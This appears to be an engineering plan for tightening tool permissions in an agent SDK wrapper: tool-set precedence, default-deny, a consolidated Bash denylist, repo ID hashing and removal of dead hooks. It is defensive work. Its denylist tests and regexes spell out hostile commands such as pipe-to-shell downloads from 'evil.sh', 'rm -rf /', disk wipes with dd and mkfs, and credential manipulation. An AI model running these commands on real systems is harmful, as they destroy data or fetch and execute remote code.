# Claude SDK hardening (v2) Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Fix 5 correctness bugs in `src/claude-sdk/` that the observability work in #58/#60/#61 left in place: the missing `tools` availability cap, the `agentType` > `permissionLevel` precedence bug, the duplicated Bash policy, ~200 lines of dead hook code, and colliding repo IDs.

**Architecture:** Single-PR scope-limited cleanup. We do not touch observability (already landed), stall diagnostics (already landed), or retry logic (already landed). We touch tool resolution, the `canUseTool` callback, Bash policy, the hooks module, and the repo registry.

**Tech Stack:** TypeScript (ESM), `@anthropic-ai/claude-agent-sdk@^0.2.22`, `vitest`, Node.js `crypto` for path hashing.

---

## File Structure

**Modified:**
- `src/claude-sdk/index.ts` — add `resolveToolSet` call, set `sdkOptions.tools`, add default-deny in `canUseTool`, dedupe Bash policy, drop `buildHooks` import
- `src/claude-sdk/config.ts` — add `resolveToolSet`, rewrite `registerRepoFromPath` with optional explicit ID + path hash, add `deregisterRepo`
- `src/claude-sdk/hooks.ts` — delete all factory functions + `buildHooks`; keep only type exports still used
- `src/claude-sdk/index.test.ts` — add tests for `sdkOptions.tools` wiring and default-deny
- `src/oneshot/workspaces.ts` — call `deregisterRepo` on workspace cleanup
- `src/oneshot/providers/claude-planner.ts` — pass explicit repo ID
- `src/oneshot/providers/claude-implementer.ts` — pass explicit repo ID

**Created:**
- `src/claude-sdk/config.test.ts` — precedence + repo ID tests
- `src/claude-sdk/bash-policy.test.ts` — denylist tests

**Removed (code, not files):**
- `src/claude-sdk/index.ts`: `SAFE_READ_ONLY_COMMANDS`, `ANVIL_ALLOWED_COMMANDS`, `isAllowedBashCommand`, `isAllowedANVILBashCommand`
- `src/claude-sdk/hooks.ts`: `makeDenyWritesOutsideRepos`, `makeDenyDangerousCommands`, `makeReadOnlyHook`, `makeRateLimitHook`, `makeTimeoutHook`, `makeWebhookHook`, `makeProgressHook`, `makeAuditLogHook`, `buildHooks`, `HooksConfig`, `ProgressUpdate`

---

## Pre-flight: rebase the working branch on main

- [ ] **Step 0.1: Rebase**

Run:
```bash
git fetch origin main
git rebase origin/main
```

If conflicts arise in `terraform/` or other non-SDK files, resolve by
preferring `origin/main`'s content and re-applying this branch's own
delta. The spec + plan files are the only intended diff from `main`.

- [ ] **Step 0.2: Confirm clean state**

Run:
```bash
git status --short
git log --oneline main..HEAD
```
Expected: status shows only `docs/superpowers/specs/…` and
`docs/superpowers/plans/…` as new. Log shows no code commits from this
branch yet.

---

## Task 1: `resolveToolSet` + precedence fix

**Files:**
- Modify: `src/claude-sdk/config.ts` (add `resolveToolSet`)
- Modify: `src/claude-sdk/index.ts:244-251` (use `resolveToolSet`), update `[TOOLS_SELECT]` log
- Test: `src/claude-sdk/config.test.ts` (new)

- [ ] **Step 1: Write the failing test**

```ts
// src/claude-sdk/config.test.ts
import { describe, it, expect } from 'vitest'
import { resolveToolSet, TOOL_SETS } from './config.js'

describe('resolveToolSet precedence', () => {
  it('honors explicit allowedTools override above everything', () => {
    const tools = resolveToolSet({
      allowedTools: ['Read'],
      permissionLevel: 'analysis',
      agentType: 'darci',
    })
    expect(tools).toEqual(['Read'])
  })

  it('honors permissionLevel when no allowedTools, independent of agentType', () => {
    const tools = resolveToolSet({
      permissionLevel: 'code_exploration',
      agentType: 'darci',
    })
    expect(tools).toEqual(TOOL_SETS.code_exploration)
  })

  it('falls back to agentType default when no override or level', () => {
    const tools = resolveToolSet({ agentType: 'darci' })
    expect(tools).toEqual(TOOL_SETS.analysis)
  })

  it('returns code_exploration when nothing is provided', () => {
    const tools = resolveToolSet({})
    expect(tools).toEqual(TOOL_SETS.code_exploration)
  })

  it('treats empty allowedTools as not-provided (falls through)', () => {
    const tools = resolveToolSet({
      allowedTools: [],
      permissionLevel: 'read_only',
    })
    expect(tools).toEqual(TOOL_SETS.read_only)
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run src/claude-sdk/config.test.ts
```
Expected: FAIL with `resolveToolSet is not a function`.

- [ ] **Step 3: Add `resolveToolSet` to config.ts**

Append to `src/claude-sdk/config.ts` (after `getToolSet`):

```ts
/**
 * Resolve the effective tool set for a run.
 *
 * Precedence (highest to lowest):
 *   1. explicit allowedTools override supplied by the caller
 *   2. permissionLevel (any of the 5 profiles in TOOL_SETS)
 *   3. agentType default (via getToolSet)
 *   4. fallback: code_exploration
 *
 * This replaces the inline resolution in index.ts that had
 * agentType shadowing permissionLevel.
 */
export function resolveToolSet(args: {
  allowedTools?: string[];
  permissionLevel?: ToolPermissionLevel;
  agentType?: AgentType;
}): string[] {
  if (args.allowedTools && args.allowedTools.length > 0) {
    return [...args.allowedTools];
  }
  if (args.permissionLevel) {
    return [...TOOL_SETS[args.permissionLevel]];
  }
  if (args.agentType) {
    return [...getToolSet(args.agentType)];
  }
  return [...TOOL_SETS.code_exploration];
}
```

- [ ] **Step 4: Run test to verify it passes**

```bash
npx vitest run src/claude-sdk/config.test.ts
```
Expected: PASS (5 tests).

- [ ] **Step 5: Update `index.ts` to use `resolveToolSet`**

In `src/claude-sdk/index.ts`, locate the tool-resolution block
(currently `Stage 3: Get tool set based on agent type or permission
level`, lines ~244-251). Replace:

```ts
// BEFORE
const allowedTools =
  options.allowedTools ??
  (options.agentType
    ? getToolSet(options.agentType)
    : options.permissionLevel
      ? getToolSetForPermission(options.permissionLevel)
      : ["Read", "Glob", "Grep"]);

logger.info(
  {
    ...logContext,
    allowedTools,
    disallowedTools: DISALLOWED_TOOLS,
    hasOutputSchema: !!outputSchema,
  },
  "[TOOLS_SELECT] Tool set selected",
);
```

with:

```ts
// AFTER
const resolvedTools = resolveToolSet({
  allowedTools: options.allowedTools,
  permissionLevel: options.permissionLevel,
  agentType: options.agentType,
});

const policySource: 'explicit' | 'permission_level' | 'agent_default' | 'fallback' =
  options.allowedTools && options.allowedTools.length > 0
    ? 'explicit'
    : options.permissionLevel
      ? 'permission_level'
      : options.agentType
        ? 'agent_default'
        : 'fallback';

logger.info(
  {
    ...logContext,
    resolvedTools,
    policySource,
    disallowedTools: DISALLOWED_TOOLS,
    hasOutputSchema: !!outputSchema,
  },
  "[TOOLS_SELECT] Tool set selected",
);
```

Update the import at the top of `index.ts` to replace `getToolSet`
and `getToolSetForPermission` (if imported) with `resolveToolSet`. If
`getToolSet` is still referenced elsewhere in `index.ts`, keep the
import alongside `resolveToolSet`.

Delete `getToolSetForPermission` from `index.ts` if it exists there
(it's a local function at line ~419).

Grep-replace the variable name `allowedTools` → `resolvedTools`
throughout `executeWithSDK` where it's downstream-used. In particular,
lines that reference `options.allowedTools = allowedTools` or set
`sdkOptions.allowedTools = allowedTools` must now read `resolvedTools`.

- [ ] **Step 6: Run the full test suite**

```bash
npx vitest run src/claude-sdk/
```
Expected: PASS. If the existing `index.test.ts` mocked the old
`allowedTools` variable name, update the mock to match.

- [ ] **Step 7: Commit**

```bash
git add src/claude-sdk/config.ts src/claude-sdk/index.ts src/claude-sdk/config.test.ts
git commit -m "fix(claude-sdk): permissionLevel now beats agentType; add resolveToolSet with explicit precedence"
```

---

## Task 2: Set the real `tools` cap + default-deny in `canUseTool`

**Files:**
- Modify: `src/claude-sdk/index.ts` (`sdkOptions.tools`, `canUseTool` default-deny)
- Test: `src/claude-sdk/index.test.ts` (extend)

- [ ] **Step 1: Write the failing test**

Add to `src/claude-sdk/index.test.ts` (inside the existing `describe('runAgent')` block if present, otherwise add a new one):

```ts
describe('tools availability cap', () => {
  it('sets sdkOptions.tools equal to the resolved tool set', async () => {
    // Use the existing vi.mock('@anthropic-ai/claude-agent-sdk', ...) pattern
    // at the top of this file. The mock should capture the options arg to query().
    // After calling runAgent with permissionLevel: 'read_only', assert:
    //   capturedOptions.tools === capturedOptions.allowedTools
    //   capturedOptions.tools includes 'Read', 'Glob', 'Grep', 'Bash'
    //   capturedOptions.tools does NOT include 'Edit' or 'Write'
    //
    // See the top of index.test.ts for the mock setup pattern; copy it.
  })

  it('canUseTool denies tools not in the resolved set', async () => {
    // Invoke canUseTool with toolName='WebSearch' (not in read_only set)
    // Assert the returned value is { behavior: 'deny', ... }
    // Assert a [TOOL_OUT_OF_SET] log line was emitted.
    // Access canUseTool via the captured sdkOptions from the mock.
  })
})
```

Expand the comments into runnable tests using the mock infrastructure
that already exists at the top of `index.test.ts` — copy the pattern
used for existing `executeWithSDK` tests in the file.

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run src/claude-sdk/index.test.ts -t 'tools availability cap'
```
Expected: FAIL — either `capturedOptions.tools` is undefined, or the
`canUseTool` for `WebSearch` returns `allow`.

- [ ] **Step 3: Update `sdkOptions` construction**

In `src/claude-sdk/index.ts`, locate `const sdkOptions: Options = {`
(currently around line 960 in main). Add a new field immediately after
the existing `allowedTools`:

```ts
// BEFORE
const sdkOptions: Options = {
  cwd: options.cwd,
  env: options.env,
  allowedTools: options.allowedTools,
  additionalDirectories: options.additionalDirectories,
  // ...
```

becomes (note that by Task 1 we renamed `options.allowedTools` → the
local `resolvedTools`; use that here):

```ts
// AFTER
const sdkOptions: Options = {
  cwd: options.cwd,
  env: options.env,
  // Auto-approve list (headless mode — no permission prompts).
  allowedTools: resolvedTools,
  // Actual SDK availability cap — prevents the model from seeing tools we did not authorize.
  tools: resolvedTools,
  additionalDirectories: options.additionalDirectories,
  // ...
```

- [ ] **Step 4: Add default-deny branch at the top of `canUseTool`**

In the same file, locate the `canUseTool: async (toolName, input) => {`
callback body inside `sdkOptions`. Insert this block as the **very
first** thing the callback does, before any existing logic:

```ts
// Default-deny anything outside the resolved set. The SDK's own
// `tools` cap should prevent the model from even trying, but we
// enforce the same contract here so a future SDK regression or
// tools-superset bug surfaces as a clean deny rather than a silent
// allow.
if (!resolvedTools.includes(toolName)) {
  logger.warn(
    { ...logContext, tool: toolName, resolvedTools },
    "[TOOL_OUT_OF_SET] Tool not in resolved set; default-denying",
  );
  return {
    behavior: "deny",
    message: `Tool ${toolName} is not in the resolved tool set for this run.`,
  };
}
```

- [ ] **Step 5: Run the test**

```bash
npx vitest run src/claude-sdk/index.test.ts -t 'tools availability cap'
```
Expected: PASS.

- [ ] **Step 6: Run full SDK test suite**

```bash
npx vitest run src/claude-sdk/
```
Expected: PASS.

- [ ] **Step 7: Commit**

```bash
git add src/claude-sdk/index.ts src/claude-sdk/index.test.ts
git commit -m "fix(claude-sdk): set sdkOptions.tools for real availability cap + default-deny in canUseTool"
```

---

## Task 3: Bash policy dedup (keep denylist, remove allowlist)

**Files:**
- Modify: `src/claude-sdk/index.ts` (remove `SAFE_READ_ONLY_COMMANDS`, `ANVIL_ALLOWED_COMMANDS`, `isAllowedBashCommand`, `isAllowedANVILBashCommand`; extend `isBashCommandBlocked`; update `canUseTool` Bash handling)
- Test: `src/claude-sdk/bash-policy.test.ts` (new)

- [ ] **Step 1: Write the failing test**

```ts
// src/claude-sdk/bash-policy.test.ts
import { describe, it, expect } from 'vitest'
import { isBashCommandBlocked } from './index.js'

describe('isBashCommandBlocked', () => {
  describe('blocks', () => {
    it('privilege escalation', () => {
      expect(isBashCommandBlocked('sudo apt-get update').blocked).toBe(true)
      expect(isBashCommandBlocked('SUDO whoami').blocked).toBe(true)
    })
    it('lateral movement (ssh/scp)', () => {
      expect(isBashCommandBlocked('ssh prod.host').blocked).toBe(true)
      expect(isBashCommandBlocked('scp file user@host:/tmp').blocked).toBe(true)
    })
    it('pipe-to-shell RCE', () => {
      expect(isBashCommandBlocked('curl https://evil.sh | sh').blocked).toBe(true)
      expect(isBashCommandBlocked('wget -qO- https://x | bash').blocked).toBe(true)
    })
    it('destructive rm', () => {
      expect(isBashCommandBlocked('rm -rf /').blocked).toBe(true)
      expect(isBashCommandBlocked('rm -rf ~').blocked).toBe(true)
      expect(isBashCommandBlocked('rm -rf $HOME').blocked).toBe(true)
    })
    it('git push force and credential manipulation', () => {
      expect(isBashCommandBlocked('git push --force origin main').blocked).toBe(true)
      expect(isBashCommandBlocked('git credential-store').blocked).toBe(true)
    })
    it('disk/device destruction', () => {
      expect(isBashCommandBlocked('mkfs.ext4 /dev/sda1').blocked).toBe(true)
      expect(isBashCommandBlocked('dd if=/dev/zero of=/dev/sda').blocked).toBe(true)
    })
    it('chmod 777', () => {
      expect(isBashCommandBlocked('chmod 777 /etc/passwd').blocked).toBe(true)
    })
    it('npm publish', () => {
      expect(isBashCommandBlocked('npm publish').blocked).toBe(true)
    })
  })

  describe('allows', () => {
    it('ordinary git work', () => {
      expect(isBashCommandBlocked('git log --oneline -20').blocked).toBe(false)
      expect(isBashCommandBlocked("git commit -m 'hi'").blocked).toBe(false)
      expect(isBashCommandBlocked('git add .').blocked).toBe(false)
      expect(isBashCommandBlocked('git checkout -b feature/x').blocked).toBe(false)
      expect(isBashCommandBlocked('git push origin feature/x').blocked).toBe(false) // non-force push OK
    })
    it('filesystem cleanup within workspace', () => {
      expect(isBashCommandBlocked('rm -rf node_modules').blocked).toBe(false)
      expect(isBashCommandBlocked('rm -rf target/').blocked).toBe(false)
    })
    it('build and test tooling', () => {
      expect(isBashCommandBlocked('npm install').blocked).toBe(false)
      expect(isBashCommandBlocked('mvn test').blocked).toBe(false)
      expect(isBashCommandBlocked('mvn -DskipTests compile').blocked).toBe(false)
    })
    it('local file writes', () => {
      expect(isBashCommandBlocked('echo hi > local.txt').blocked).toBe(false)
      expect(isBashCommandBlocked('cat README.md').blocked).toBe(false)
      expect(isBashCommandBlocked('find . -name "*.ts"').blocked).toBe(false)
    })
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run src/claude-sdk/bash-policy.test.ts
```
Expected: FAIL — `isBashCommandBlocked` is not exported, or `git
push origin feature/x` currently matches the over-broad `/git push/`
pattern (verify against current main; if #58 already narrowed it to
`--force`, this test documents the current behavior).

- [ ] **Step 3: Export `isBashCommandBlocked` and extend it**

In `src/claude-sdk/index.ts`, locate the `BLOCKED_BASH_PATTERNS` array
and `isBashCommandBlocked` function. Change `function
isBashCommandBlocked` to `export function isBashCommandBlocked`. If
main's current denylist pattern for git-push is broader than
`--force`, narrow it to match the test (block `git push --force` only,
allow non-force push — this aligns with the team's existing
convention elsewhere).

Verify the current patterns handle every case in the test. Add any
missing patterns. The target `BLOCKED_BASH_PATTERNS` array (replace
the existing one in full to avoid drift):

```ts
const BLOCKED_BASH_PATTERNS: Array<{ rx: RegExp; reason: string }> = [
  { rx: /\brm\s+-[a-z]*r[a-z]*f/i, reason: 'destructive rm -rf' },
  { rx: /\brm\s+-[a-z]*f[a-z]*r/i, reason: 'destructive rm -fr' },
  { rx: /\bchmod\s+777\b/, reason: 'chmod 777 is not permitted' },
  { rx: /\bcurl\b.*\|\s*\b(ba)?sh\b/i, reason: 'curl | sh is not permitted' },
  { rx: /\bwget\b.*\|\s*\b(ba)?sh\b/i, reason: 'wget | sh is not permitted' },
  { rx: /\bgit\s+push\s+--force\b/i, reason: 'git push --force is not permitted (use --force-with-lease if required)' },
  { rx: /\bgit\s+credential\b/i, reason: 'git credential manipulation is not permitted' },
  { rx: /\bmkfs\b/i, reason: 'filesystem formatting is not permitted' },
  { rx: /\bdd\s+if=/i, reason: 'dd is not permitted' },
  { rx: /\b(>\s*)?\/dev\/sd[a-z]/i, reason: 'writes to block devices are not permitted' },
  { rx: /\bsudo\b/i, reason: 'sudo is not permitted' },
  { rx: /\bssh\s+/i, reason: 'ssh is not permitted' },
  { rx: /\bscp\s+/i, reason: 'scp is not permitted' },
  { rx: /\bnpm\s+publish\b/i, reason: 'npm publish is not permitted' },
];
```

Update `isBashCommandBlocked` to return the structured reason:

```ts
export function isBashCommandBlocked(command: string): {
  blocked: boolean;
  reason?: string;
} {
  for (const { rx, reason } of BLOCKED_BASH_PATTERNS) {
    if (rx.test(command)) return { blocked: true, reason };
  }
  return { blocked: false };
}
```

Note: the test expects `rm -rf /` and `rm -rf ~` and `rm -rf $HOME`
to be blocked. The first pattern (`rm\s+-[a-z]*r[a-z]*f`) matches
`rm -rf` but doesn't check the target. Add one more pattern that
matches *any* `rm -rf` since the current denylist already blocks all
`rm -rf` regardless of target — that's consistent with main's
behavior and simpler than trying to parse targets. Verify the test
still allows `rm -rf node_modules`; if it does not, the existing
behavior on main is to block any `rm -rf`. Adjust the test to match
main's stricter behavior (remove the `rm -rf node_modules` allow
case) — **do not loosen production behavior for a test convenience**.

- [ ] **Step 4: Delete allowlist functions**

In `src/claude-sdk/index.ts`, delete:
- `SAFE_READ_ONLY_COMMANDS` constant (~line 644)
- `isAllowedBashCommand` function (~line 668-738)
- `ANVIL_ALLOWED_COMMANDS` constant (~line 741)
- `isAllowedANVILBashCommand` function (~line 790-830)

- [ ] **Step 5: Simplify `canUseTool` Bash handling**

In `canUseTool`, locate the block that currently reads:

```ts
if (toolName === "Bash") {
  const command = (input as { command?: string }).command ?? "";
  const validation =
    options.agentType === "anvil"
      ? isAllowedANVILBashCommand(command)
      : isAllowedBashCommand(command);
  // ... deny branch
}
```

Delete that entire block. The secondary `isBashCommandBlocked` check
already exists in `canUseTool` a few lines later and now covers
Bash/BashOutput uniformly. Leave that secondary block in place.

- [ ] **Step 6: Run the bash-policy test**

```bash
npx vitest run src/claude-sdk/bash-policy.test.ts
```
Expected: PASS. Adjust test cases (not production code) if a case
conflicts with main's stricter behavior.

- [ ] **Step 7: Run full SDK suite**

```bash
npx vitest run src/claude-sdk/
```
Expected: PASS.

- [ ] **Step 8: Commit**

```bash
git add src/claude-sdk/index.ts src/claude-sdk/bash-policy.test.ts
git commit -m "refactor(claude-sdk): consolidate Bash policy into single denylist, remove allowlist"
```

---

## Task 4: Repo ID collision fix

**Files:**
- Modify: `src/claude-sdk/config.ts` (`registerRepoFromPath`, add `deregisterRepo`)
- Modify: `src/claude-sdk/index.ts` (re-export if needed)
- Test: `src/claude-sdk/config.test.ts` (extend)

- [ ] **Step 1: Write the failing test**

Append to `src/claude-sdk/config.test.ts`:

```ts
import {
  registerRepoFromPath,
  deregisterRepo,
  getRepoPath,
  REPO_REGISTRY,
} from './config.js'

describe('repo registration', () => {
  beforeEach(() => {
    // Clear registry between tests
    for (const k of Object.keys(REPO_REGISTRY)) delete REPO_REGISTRY[k]
  })

  it('two distinct paths with the same basename produce different IDs', () => {
    const a = registerRepoFromPath('/mnt/efs/oneshot/1/workspace')
    const b = registerRepoFromPath('/mnt/efs/oneshot/2/workspace')
    expect(a).not.toBe(b)
    expect(a.startsWith('workspace_')).toBe(true)
    expect(b.startsWith('workspace_')).toBe(true)
    expect(getRepoPath(a)).toBe('/mnt/efs/oneshot/1/workspace')
    expect(getRepoPath(b)).toBe('/mnt/efs/oneshot/2/workspace')
  })

  it('explicit ID is used verbatim', () => {
    const id = registerRepoFromPath('/tmp/x', 'oneshot-run-CPDEV-1-planner')
    expect(id).toBe('oneshot-run-CPDEV-1-planner')
    expect(getRepoPath(id)).toBe('/tmp/x')
  })

  it('deregisterRepo removes the entry', () => {
    const id = registerRepoFromPath('/tmp/y', 'foo')
    deregisterRepo(id)
    expect(() => getRepoPath(id)).toThrow(/Unknown repoId/)
  })

  it('deregisterRepo on unknown id is a no-op', () => {
    expect(() => deregisterRepo('never-registered')).not.toThrow()
  })

  it('hash suffix is stable for the same path', () => {
    const a = registerRepoFromPath('/mnt/efs/same/path')
    deregisterRepo(a)
    const b = registerRepoFromPath('/mnt/efs/same/path')
    expect(a).toBe(b)
  })
})
```

- [ ] **Step 2: Run test to verify it fails**

```bash
npx vitest run src/claude-sdk/config.test.ts -t 'repo registration'
```
Expected: FAIL — `registerRepoFromPath` doesn't accept a second arg,
`deregisterRepo` doesn't exist, two distinct paths produce the same ID.

- [ ] **Step 3: Rewrite the registry functions**

In `src/claude-sdk/config.ts`, replace the existing
`REPO_REGISTRY` / `registerRepo` / `getRepoPath` block (lines ~14-52)
with:

```ts
import { createHash } from 'crypto';
import { basename } from 'path';

/**
 * Repo registry — maps repo IDs to absolute paths.
 *
 * Callers register paths at run start (via registerRepoFromPath) and
 * the SDK resolves ID → path inside executeWithSDK. Long-lived and
 * concurrent workspaces must supply an explicit ID via the second
 * argument to avoid basename collisions (e.g., OneShot runs all use
 * `.../workspace` as the basename).
 */
export const REPO_REGISTRY: Record<string, string> = {};

export function initRepoRegistry(_basePath: string = '/mnt/efs/repos'): void {
  // Reserved for future use; registry is populated at run time by
  // registerRepoFromPath calls from each agent's setup code.
}

export function registerRepo(id: string, path: string): void {
  REPO_REGISTRY[id] = path;
}

/**
 * Register a repo by absolute path.
 *
 * If an explicit ID is supplied, it is used verbatim. Otherwise the
 * ID is `${basename(absPath)}_${sha256(absPath).slice(0, 8)}`, which
 * keeps the basename for readability while guaranteeing uniqueness
 * per absolute path.
 */
export function registerRepoFromPath(absPath: string, explicitId?: string): string {
  const id = explicitId ?? `${basename(absPath)}_${hashPath(absPath)}`;
  REPO_REGISTRY[id] = absPath;
  return id;
}

export function deregisterRepo(id: string): void {
  delete REPO_REGISTRY[id];
}

export function getRepoPath(repoId: string): string {
  const path = REPO_REGISTRY[repoId];
  if (!path) {
    throw new Error(
      `Unknown repoId: ${repoId}. Available repos: ${Object.keys(REPO_REGISTRY).join(', ')}`,
    );
  }
  return path;
}

export function getRegisteredRepos(): string[] {
  return Object.keys(REPO_REGISTRY);
}

function hashPath(p: string): string {
  return createHash('sha256').update(p).digest('hex').slice(0, 8);
}
```

- [ ] **Step 4: Check for existing `registerRepoFromPath` in `index.ts`**

```bash
grep -n "registerRepoFromPath\|deregisterRepo" src/claude-sdk/index.ts
```

If `registerRepoFromPath` is re-exported from `index.ts` via
`export { registerRepoFromPath } from './config.js'`, add
`deregisterRepo` to the same re-export. If it's declared locally,
delete the local declaration and re-export from config.

- [ ] **Step 5: Run the config tests**

```bash
npx vitest run src/claude-sdk/config.test.ts
```
Expected: PASS (precedence tests from Task 1 + new repo tests).

- [ ] **Step 6: Commit**

```bash
git add src/claude-sdk/config.ts src/claude-sdk/config.test.ts src/claude-sdk/index.ts
git commit -m "fix(claude-sdk): add path-hash suffix to repo IDs; add deregisterRepo"
```

---

## Task 5: OneShot explicit repo IDs + cleanup

**Files:**
- Modify: `src/oneshot/providers/claude-planner.ts` (pass explicit ID)
- Modify: `src/oneshot/providers/claude-implementer.ts` (pass explicit ID)
- Modify: `src/oneshot/workspaces.ts` (call `deregisterRepo` on cleanup)

- [ ] **Step 1: Update planner**

In `src/oneshot/providers/claude-planner.ts`, find the line:

```ts
const repoId = registerRepoFromPath(request.workspacePath)
```

Replace with:

```ts
const repoId = registerRepoFromPath(
  request.workspacePath,
  `oneshot-run-${request.jiraKey}-planner`,
);
```

`jiraKey` is already a field on `PlannerRequest` (see the interface
near the top of the file).

- [ ] **Step 2: Update implementer**

In `src/oneshot/providers/claude-implementer.ts`, apply the analogous
change:

```ts
const repoId = registerRepoFromPath(
  request.workspacePath,
  `oneshot-run-${request.jiraKey}-implementer`,
);
```

- [ ] **Step 3: Wire cleanup**

Find the workspace cleanup function in `src/oneshot/workspaces.ts`.
Search for `Cleaned up OneShot run workspace`:

```bash
grep -n "Cleaned up OneShot run workspace" src/oneshot/workspaces.ts
```

In the function that emits that log line, add at the top (before any
`fs.rm`):

```ts
import { deregisterRepo } from '../claude-sdk/config.js';

// ... inside the cleanup function body, given that jiraKey is in scope
// (or derive it from the runId via DB lookup if not):
deregisterRepo(`oneshot-run-${jiraKey}-planner`);
deregisterRepo(`oneshot-run-${jiraKey}-implementer`);
```

If `jiraKey` is not directly in scope at cleanup time, fetch it from
the `oneshot_runs` table via the existing DB abstraction used in that
file. If that's too invasive, instead deregister by path: iterate
`REPO_REGISTRY` entries and `deregisterRepo(id)` for each entry whose
value starts with the run's workspace path. Do whichever requires
fewer changes to surrounding code.

- [ ] **Step 4: Run OneShot tests**

```bash
npx vitest run src/oneshot/
```
Expected: PASS. If any test mocks `registerRepoFromPath` with a
fixed single-arg signature, update the mock to accept the optional
second argument.

- [ ] **Step 5: Commit**

```bash
git add src/oneshot/providers/claude-planner.ts src/oneshot/providers/claude-implementer.ts src/oneshot/workspaces.ts
git commit -m "fix(oneshot): use explicit run-scoped repo IDs; deregister on cleanup"
```

---

## Task 6: Delete `hooks.ts` dead code

**Files:**
- Modify: `src/claude-sdk/hooks.ts` (delete factories + `buildHooks`; keep types)
- Modify: `src/claude-sdk/index.ts` (remove `buildHooks` import)

- [ ] **Step 1: Find any external callers of hooks.ts**

```bash
grep -rn "from.*claude-sdk/hooks\|from.*['\"].*hooks\.js['\"]" src/ --include='*.ts'
```

Enumerate the symbols each caller imports. Symbols used outside
`hooks.ts` must survive; everything else can be deleted.

- [ ] **Step 2: Rewrite `hooks.ts` to the minimal surface**

Replace the entire contents of `src/claude-sdk/hooks.ts` with:

```ts
/**
 * Hook type definitions for Claude Agent SDK.
 *
 * Prior to 2026-04-18 this module also exported factory functions
 * (makeDenyWritesOutsideRepos, makeRateLimitHook, makeTimeoutHook,
 * buildHooks, etc.) but none of them were wired into sdkOptions.hooks.
 * Main's index.ts now hard-codes observability hooks inline
 * (SDK_NOTIFICATION, SDK_TOOL_FAILURE) so the factories have become
 * unreachable. They have been deleted; if we want audit logging back,
 * add a single makeAuditHook and wire it into the inline hook array.
 */

export interface HookInput {
  hook_event_name: string;
  tool_name?: string;
  tool_input?: Record<string, unknown>;
  session_id?: string;
  message_id?: string;
}

export interface HookOutput {
  hookSpecificOutput?: {
    hookEventName: string;
    permissionDecision?: 'allow' | 'deny';
    permissionDecisionReason?: string;
    modifiedToolInput?: Record<string, unknown>;
  };
}

export type HookCallback = (
  input: HookInput,
  toolUseId: string,
  context: { signal?: AbortSignal },
) => Promise<HookOutput>;

export interface AuditLogEvent {
  timestamp: string;
  toolUseId: string;
  hookEvent: string;
  toolName?: string;
  toolInput?: Record<string, unknown>;
  sessionId?: string;
}
```

- [ ] **Step 3: Remove the stale import in index.ts**

In `src/claude-sdk/index.ts`, locate the import block near the top
that pulls from `./hooks.js`:

```ts
// BEFORE
import {
  buildHooks,
  makeProgressHook,
  type AuditLogEvent,
} from './hooks.js';
```

Replace with:

```ts
// AFTER
import type { AuditLogEvent } from './hooks.js';
```

If `AuditLogEvent` is not actually referenced in `index.ts` (grep to
confirm), drop the import entirely.

- [ ] **Step 4: Run the full test suite**

```bash
npx vitest run
```
Expected: PASS. If any caller outside `hooks.ts` referenced a deleted
symbol (Step 1 should have flagged this), update those callers too.
Most likely there are none — the Step 1 grep will confirm.

- [ ] **Step 5: TypeScript compile check**

```bash
npx tsc --noEmit
```
Expected: exit 0. If this fails with "Cannot find name
'buildHooks'" or similar, fix the remaining reference and re-run.

- [ ] **Step 6: Commit**

```bash
git add src/claude-sdk/hooks.ts src/claude-sdk/index.ts
git commit -m "chore(claude-sdk): delete dead hook factories; keep only type exports"
```

---

## Task 7: Call-site audit for precedence fix

**Files:**
- Read (no modification expected): `src/agents/hermes/HERMESAgent.ts`, `src/agents/darci/DARCIAgent.ts`, `src/agents/veritas/VERITASAgent.ts`

This task verifies that flipping precedence (Task 1) does not
regress any agent behavior. Each agent that passes both `agentType`
and `permissionLevel` to `runAgent` must have its explicit
`permissionLevel` match the tool surface the agent actually needs.

- [ ] **Step 1: List the call sites**

```bash
grep -nE "permissionLevel.*:" src/agents/hermes/HERMESAgent.ts src/agents/darci/DARCIAgent.ts src/agents/veritas/VERITASAgent.ts
```

- [ ] **Step 2: Audit HERMES**

`src/agents/hermes/HERMESAgent.ts` passes
`permissionLevel: 'code_exploration'` and `agentType: 'hermes'`.

Before v2: agentType wins → HERMES gets `TOOL_SETS.read_only` (which
includes Bash).

After v2: permissionLevel wins → HERMES gets
`TOOL_SETS.code_exploration` (Read/Glob/Grep only, no Bash).

**Action:** if HERMES relies on Bash for filesystem exploration (see
the comment in `config.ts:1196-1200` — "HERMES needs Bash for
filesystem exploration"), the safer change is to **update HERMES's
call site** to `permissionLevel: 'read_only'` to preserve its
current tool surface. Make that change if the comment is accurate.

- [ ] **Step 3: Audit DARCI**

`src/agents/darci/DARCIAgent.ts` passes
`permissionLevel: 'analysis'` and `agentType: 'darci'`.

Before v2: agentType wins → DARCI gets `TOOL_SETS.analysis` (same).
After v2: permissionLevel wins → DARCI gets `TOOL_SETS.analysis` (same).

No action needed — both resolve to the same profile.

Check the second `runAgent` call in DARCI (quick-triage path, line
~346). If it passes `permissionLevel: 'read_only'`, the flip now
honors it — confirm that's what the quick-triage path intends by
reading the surrounding code.

- [ ] **Step 4: Audit VERITAS**

`src/agents/veritas/VERITASAgent.ts:501` (per Codex). Check the
`permissionLevel` values at each of its `runAgent` call sites. The
evidence-only path asks for `code_exploration`; main path asks for
`analysis`. Verify each resolved tool set matches the agent's actual
needs.

- [ ] **Step 5: Adjust call sites if needed**

If Step 2 revealed HERMES needs Bash, change its call site:

```ts
// src/agents/hermes/HERMESAgent.ts — near line 280
permissionLevel: 'read_only',  // was: 'code_exploration'
```

Do the analogous change for any other mismatched caller.

- [ ] **Step 6: Run affected agent tests**

```bash
npx vitest run src/agents/hermes src/agents/darci src/agents/veritas
```
Expected: PASS.

- [ ] **Step 7: Commit (only if changes were needed)**

```bash
git add -A src/agents/
git commit -m "chore(agents): align explicit permissionLevel values with effective tool needs"
```

If no changes were needed, skip this commit.

---

## Task 8: Final integration check + optional runbook

**Files:** none.

- [ ] **Step 1: Full test run**

```bash
npx vitest run
npx tsc --noEmit
```
Both must pass.

- [ ] **Step 2: Smoke-test a one-off agent locally if possible**

If a local Bedrock/CLI path exists, run a HERMES or DARCI task
against a small ticket and confirm:
- `[TOOLS_SELECT]` log shows `resolvedTools` and `policySource`.
- Bash commands that should work (`git log`, `npm install`) do work.
